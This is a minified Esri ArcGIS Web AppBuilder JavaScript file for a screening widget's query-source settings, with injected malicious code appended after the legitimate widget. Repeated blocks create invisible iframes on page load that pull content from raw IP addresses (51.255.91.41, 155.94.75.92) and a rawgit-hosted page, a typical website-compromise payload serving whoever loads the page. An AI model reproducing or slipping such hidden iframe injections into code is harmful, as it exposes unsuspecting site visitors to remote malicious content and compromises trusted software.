// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/setting/QuerySourceSetting.html":'\x3cdiv class\x3d"esriCTMainContainer" style\x3d"width: 100%; height: 100%;"\x3e\r\n  \x3c!--Select geocoder url --\x3e\r\n  \x3cdiv class\x3d"esriCTSourceUrlSection"\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTURLWidthLabel esriCTlabel" title\x3d"${nls.layerSource}"\x3e\r\n        ${nls.layerSource}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceURLField"\x3e\r\n        \x3cdiv class\x3d"esriCTSearchSourceLayer" data-dojo-attach-point\x3d"sourceUrl" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"required:true,trim:true,disabled:true,style:{width:\'100%\'}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTURLSetButton jimu-btn jimu-float-trailing jimu-leading-margin1" data-dojo-attach-point\x3d"setSourceBtnClickNode"\r\n          title\x3d"${nls.set}"\x3e${nls.set}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"messageTr"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"messageNode" class\x3d"esriCTHint esriCTErrorMessage"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3c!--Details section --\x3e\r\n  \x3cdiv class\x3d"esriCTSourceDetailsSection"\x3e\r\n    \x3c!--Details section: Name --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.common.name}"\x3e\r\n        ${nls.common.name}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"sourceName" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"trim:true,required:true,style:{width:\'100%\'}"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: Placeholder --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.placeholder}"\x3e\r\n        ${nls.placeholder}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"placeholder" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"trim:true,style:{width:\'100%\'}"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: searchFields --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.searchFields}"\x3e\r\n        ${nls.searchFields}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"searchFields" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"required:true,trim:true,disabled:true,style:{width:\'95%\'}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTsearchFieldsSelector jimu-float-trailing" data-dojo-attach-point\x3d"fieldsSelectorNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: displayField --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.displayField}"\x3e\r\n        ${nls.displayField}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"displayField" data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d\'style:{width:"100%"}\'\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: maxSuggestions --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.maxSuggestions}"\x3e\r\n        ${nls.maxSuggestions}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv class\x3d"esriCTHint" title\x3d"${nls.searchLayerTips}" data-dojo-attach-point\x3d"tipsNode"\x3e\r\n          ${nls.searchLayerTips}\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"maxSuggestions" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1,places:0},style:{width:\'100%\'},value:6"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: maxResult --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.maxResults}"\x3e\r\n        ${nls.maxResults}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"maxResults" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1,places:0},style:{width:\'100%\'},value:6"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: zoomScale --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row" data-dojo-attach-point\x3d"zoomScaleTr"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabel esriCTlabel" title\x3d"${nls.zoomScale}"\x3e\r\n        ${nls.zoomScale}\x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLayerField esriCTLayerField"\x3e\r\n        \x3cdiv class\x3d"jimu-float-leading esriCTSearchSourceLabelFont" style\x3d"line-height:30px;"\x3e1: \x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-float-trailing" data-dojo-attach-point\x3d"zoomScale" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1},style:{width:\'96%\'},value:50000"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: exactMatch --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabelFont" data-dojo-attach-point\x3d"exactMatch"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!--Details section: search in current map extent --\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabelFont" data-dojo-attach-point\x3d"searchInCurrentMapExtent"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3c!--Details section: loading shelter --\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d"hidden:true"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/html dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./QuerySourceSetting.html dojo/_base/lang dojo/_base/array dojo/on dojo/query dojo/Deferred dojo/Evented jimu/dijit/_FeaturelayerSourcePopup jimu/portalUrlUtils esri/request esri/lang jimu/utils jimu/dijit/Popup jimu/dijit/CheckBox jimu/dijit/LoadingShelter dijit/form/ValidationTextBox dojo/NodeList-data".split(" "),function(n,c,p,q,r,t,d,h,g,k,u,v,w,m,x,y,f,z,l){return n([p,
q,r,v],{baseClass:"jimu-widget-screening-query-source-setting",templateString:t,_layerDefinition:null,_fieldsCheckBox:null,_layerId:null,_suggestible:!1,_clickSet:!1,nls:null,appConfig:null,map:null,tr:null,config:null,fieldsPopup:null,constructor:function(a){this._layerId=this._fieldsCheckBox=this._layerDefinition=null;this._clickSet=this._suggestible=!1;this.fieldsPopup=this.config=this.tr=this.map=this.appConfig=this.nls=null;d.mixin(this,a)},postMixInProperties:function(){this.nls.common={};this.nls.common=
window.jimuNls.common},postCreate:function(){this.inherited(arguments);this.own(g(this.setSourceBtnClickNode,"click",d.hitch(this,this._onSetSourceClick)));this.own(g(this.sourceName,"Blur",d.hitch(this,this._onSourceNameBlur)));this.own(g(this.placeholder,"Blur",d.hitch(this,this._onPlaceholderBlur)));this.own(g(this.fieldsSelectorNode,"click",d.hitch(this,this._onFieldsSelectorClick)));this.exactMatch=new l({checked:!1,label:this.nls.exactMatch},this.exactMatch);this.searchInCurrentMapExtent=new l({checked:!1,
label:this.nls.searchInCurrentMapExtent},this.searchInCurrentMapExtent);this._layerDefinition={};this._fieldsCheckBox=[];this._setMessageNodeContent("")},setDefinition:function(a){this._layerDefinition=a||{}},getDefinition:function(){return this._layerDefinition},setRelatedTr:function(a){this.tr=a},getRelatedTr:function(){return this.tr},setConfig:function(a){if("[object Object]"===Object.prototype.toString.call(a)){var b=a.url;b&&(this.config=a,this.shelter.show(),this._layerDefinition.url!==b?this._getDefinitionFromRemote(b).then(d.hitch(this,
function(a){b&&a&&"error"!==a.type?(this._layerDefinition=a,this._layerDefinition.url=b,this._setSourceItems(),this._setMessageNodeContent("")):b&&a&&"error"===a.type&&(this._setSourceItems(),this._disableSourceItems(),this._setMessageNodeContent(y.substitute({URL:a.url},d.clone(this.nls.invalidUrlTip)),!0));this.shelter.hide()})):(this._setMessageNodeContent(""),this._setSourceItems(),this.shelter.hide()))}},isValidConfig:function(){var a=this.getConfig();return a.url&&a.name&&a.displayField?!0:
!1},showValidationTip:function(){this._showValidationErrorTip(this.sourceUrl);this._showValidationErrorTip(this.sourceName)},getConfig:function(){return{layerId:this._layerId,url:this.sourceUrl.get("value"),name:f.stripHTML(this.sourceName.get("value")),placeholder:f.stripHTML(this.placeholder.get("value")),searchFields:this._getSearchFields(),displayField:this.displayField.get("value"),exactMatch:this.exactMatch.getValue(),searchInCurrentMapExtent:this.searchInCurrentMapExtent.checked,zoomScale:this.zoomScale.get("value")||
5E4,maxSuggestions:this.maxSuggestions.get("value")||6,maxResults:this.maxResults.get("value")||6,type:"query"}},destroy:function(){this.inherited(arguments);this.fieldsPopup&&(this.fieldsPopup.close(),this.fieldsPopup=null);this.tr=this.nls=this.config=this._layerDefinition=null},_onSourceNameBlur:function(){this.sourceName.set("value",f.stripHTML(this.sourceName.get("value")))},_onPlaceholderBlur:function(){this.placeholder.set("value",f.stripHTML(this.placeholder.get("value")))},_disableSourceItems:function(){this.sourceName.set("disabled",
!0);this.placeholder.set("disabled",!0);this.searchFields.set("disabled",!0);c.setStyle(this.fieldsSelectorNode,"display","none");this.displayField.set("disabled",!0);this.maxSuggestions.set("disabled",!0);this.maxResults.set("disabled",!0);this.zoomScale.set("disabled",!0)},_enableSourceItems:function(){this.sourceName.set("disabled",!1);this.placeholder.set("disabled",!1);this.searchFields.set("disabled",!1);c.setStyle(this.fieldsSelectorNode,"display","inline-block");this.displayField.set("disabled",
!1);this.maxSuggestions.set("disabled",!1);this.maxResults.set("disabled",!1);this.zoomScale.set("disabled",!1)},_setSourceItems:function(){this.sourceUrl.set("value",this.config.url);this.sourceName.set("value",f.stripHTML(this.config.name||""));this.placeholder.set("value",f.stripHTML(this.config.placeholder||""));this._setSearchFields2Node();this.searchFields.set("value",this._getSearchFieldsAlias());this._setDisplayFieldOptions();this.displayField.set("value",this.config.displayField||"");this.exactMatch.setValue(!!this.config.exactMatch);
this.searchInCurrentMapExtent.setValue(!!this.config.searchInCurrentMapExtent);this.zoomScale.set("value",this.config.zoomScale||5E4);this.maxSuggestions.set("value",this.config.maxSuggestions||6);this.maxResults.set("value",this.config.maxResults||6);this._layerId=this.config.layerId;(this._suggestible=this._layerDefinition&&this._layerDefinition.advancedQueryCapabilities&&this._layerDefinition.advancedQueryCapabilities.supportsPagination)?this._hideSuggestibleTips():this._showSuggestibleTips();
this._layerDefinition&&"esriGeometryPoint"===this._layerDefinition.geometryType?c.setStyle(this.zoomScaleTr,"display",""):c.setStyle(this.zoomScaleTr,"display","none");this._enableSourceItems()},_getDefinitionFromRemote:function(a){var b=new u,c=x({url:a,content:{f:"json"},handleAs:"json",callbackParamName:"callback"});this.own(c);c.then(d.hitch(this,function(a){b.resolve(a)}),d.hitch(this,function(c){console.error(c);b.resolve({type:"error",url:this._getRequestUrl(a)})}));return b.promise},_setMessageNodeContent:function(a,
b){c.empty(this.messageNode);a.nodeType||(a=c.toDom(a));c.place(a,this.messageNode);b?c.setStyle(this.messageTr,"display",""):c.setStyle(this.messageTr,"display","none")},_getRequestUrl:function(a){var b=window.location.protocol;return"http:"===b?m.setHttpProtocol(a):"https:"===b?m.setHttpsProtocol(a):a},_setSearchFields2Node:function(){var a=null,b=this._layerDefinition&&this._layerDefinition.fields&&0<this._layerDefinition.fields.length;this.config&&this.config.searchFields&&0<this.config.searchFields.length||
(a=[]);if(b)var c=this._layerDefinition.fields,a=h.filter(this.config.searchFields,function(a){return h.some(c,function(b){return b.name===a})});else a=this.config.searchFields;this.searchFields.set("_fields",a)},_setDisplayFieldOptions:function(){var a=[];this._layerDefinition&&this._layerDefinition.fields&&0<this._layerDefinition.fields.length?a=h.map(this._layerDefinition.fields,function(a){return{label:a.alias||a.name||"",value:a.name||""}}):this.config&&this.config.displayField&&(a=[{label:this.config.displayField,
value:this.config.displayField}]);this.displayField.set("options",a)},_getSearchFieldsAlias:function(){var a=this._getSearchFields();if(!(a&&0<a.length))return"";if(this._layerDefinition&&this._layerDefinition.fields&&0<this._layerDefinition.fields.length){for(var b=this._layerDefinition.fields,c=h.map(b,function(a){return a&&a.name}),d=[],e=0,g=a.length;e<g;e++){var f=c.indexOf(a[e]);-1<f&&(b[f].alias?d.push(b[f].alias):d.push(b[f].name))}return d.join(",")}return a.join(",")},_getSearchFields:function(){return this.searchFields.get("_fields")},
_setSearchFields:function(a){this.searchFields.set("_fields",a)},_onSetSourceClick:function(){this._clickSet=!0;this._openServiceChooser()},_openQuerySourceChooser:function(){this._clickSet=!1;this._openServiceChooser()},_openServiceChooser:function(){var a=new w({titleLabel:this.nls.setLayerSource,dijitArgs:{multiple:!1,createMapResponse:this.map.webMapResponse,portalUrl:this.appConfig.portalUrl,style:{height:"100%"}}});g.once(a,"ok",d.hitch(this,function(b){a.close();this.setDefinition(b.definition||
{});this.setConfig({layerId:b.layerInfo&&b.layerInfo.id||null,url:b.url,name:b.name||"",placeholder:"",searchFields:[],displayField:this._layerDefinition.displayField||"",exactMatch:!1,zoomScale:5E4,maxSuggestions:6,maxResults:6,type:"query"});a=null;this._setMessageNodeContent("");this._clickSet?this.emit("reselect-query-source-ok",b):this.emit("select-query-source-ok",b)}));g.once(a,"cancel",d.hitch(this,function(){a.close();a=null;this.emit("select-query-source-cancel")}))},_onFieldsSelectorClick:function(){var a=
c.create("div",{style:{maxHeight:"480px"}}),b=this._layerDefinition.fields;this._fieldsCheckBox=[];h.forEach(b,d.hitch(this,function(b,d){var e=new l({checked:this._isSearchable(b),label:b.alias||b.name});c.addClass(e.domNode,"esriCTSearchSourceFieldCheckbox");c.addClass(e.labelNode,"jimu-ellipsis");c.setAttr(e.domNode,{title:b.alias||b.name});0===d%3&&(window.isRTL?c.setStyle(e.domNode,"marginRight",0):c.setStyle(e.domNode,"marginLeft",0));e.placeAt(a);k(e.domNode).data("fieldName",b.name);this._fieldsCheckBox.push(e)}));
this.fieldsPopup=new z({titleLabel:this.nls.setSearchFields,autoHeight:!0,content:a,container:window.jimuConfig.layoutId,width:640,maxHeight:600,buttons:[{label:this.nls.common.ok,onClick:d.hitch(this,"_onSearchFieldsOk")},{label:this.nls.common.cancel}],onClose:d.hitch(this,function(){this.fieldsPopup=null})});c.addClass(this.fieldsPopup.domNode,this.baseClass)},_onSearchFieldsOk:function(){var a=[];h.forEach(this._fieldsCheckBox,function(b){if(b.getValue()){var c=k(b.domNode).data("fieldName");
a.push(c[0]);k(b.domNode).removeData()}});this._setSearchFields(a);this.searchFields.set("value",this._getSearchFieldsAlias());this.fieldsPopup.close()},_isSearchable:function(a){var b=this._getSearchFields();return h.some(b,d.hitch(this,function(b){return a.name===b}))},_showSuggestibleTips:function(){c.removeClass(this.tipsNode,"esriCTHidden");c.setStyle(this.maxSuggestions.domNode,"display","none")},_hideSuggestibleTips:function(){c.addClass(this.tipsNode,"esriCTHidden");c.setStyle(this.maxSuggestions.domNode,
"display","block")},_showValidationErrorTip:function(a){if(!a.validate()&&a.domNode&&a.focusNode){var b=a.get("disabled");b&&a.set("disabled",!1);a.focusNode.focus();setTimeout(d.hitch(this,function(){a.focusNode.blur();b&&a.set("disabled",!0);a=null}),100)}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});